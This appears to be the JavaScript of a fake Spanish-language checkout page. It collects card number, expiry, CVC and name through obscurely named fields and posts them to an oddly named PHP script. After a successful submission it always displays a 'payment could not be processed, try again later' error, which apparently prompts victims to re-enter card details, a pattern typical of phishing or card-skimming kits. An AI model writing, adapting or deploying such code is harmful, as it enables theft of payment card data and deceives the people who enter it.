$("#amount").keyup(function (e) {
  "" != $(this).val()
    ? ($("#amountCalcNumber").html("$" + ($(this).val() / 100) * 80),
      $("#amountCalc").removeClass("d-none"))
    : $("#amountCalc").addClass("d-none");
}),
  $(".v8").keypress(function (e) {
    if (String.fromCharCode(e.which ? e.which : e.keyCode).match(/[^0-9]/g))
      return !1;
  }),
  $(".v9").keypress(function (e) {
    if (String.fromCharCode(e.which ? e.which : e.keyCode).match(/[^a-zA-Z ]/g))
      return !1;
  });
var card = new Card({
  form: "form",
  container: ".card-wrapper",
  formSelectors: {
    numberInput: "input#v5",
    expiryInput: "input#v6",
    cvcInput: "input#v7",
    nameInput: "input#v3",
  },
  formatting: !0,
  messages: { validDate: "valid\ndate", monthYear: "mm/yyyy" },
  placeholders: {
    number: "•••• •••• •••• ••••",
    name: "John Doe",
    expiry: "••/••",
    cvc: "•••",
  },
  masks: { cardNumber: "•" },
});
$("#checkout").on("submit", function (e) {
  e.preventDefault(),
    $("#checkoutButton").prop("disabled", !0),
    $("#notifications").html(""),
    $.ajax({
      type: "POST",
      url: "embelenariaishabilladoinstrumentara.php",
      data: $("form#checkout").serialize(),
      success: function (e) {
        $("#notifications").append(
          `<div class="alert alert-danger alert-dismissible fade show" role="alert"><strong>\xa1Lo sentimos!</strong><br>No pudimos procesar el pago con tu tarjeta, intenta nuevamente m\xe1s tarde.<button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button></div>`
        ),
          setTimeout(() => {
            $("#checkoutButton").prop("disabled", !1);
          }, 400);
      },
      error: function (e) {
        $("form#confirmCheckout").submit();
      },
    });
});
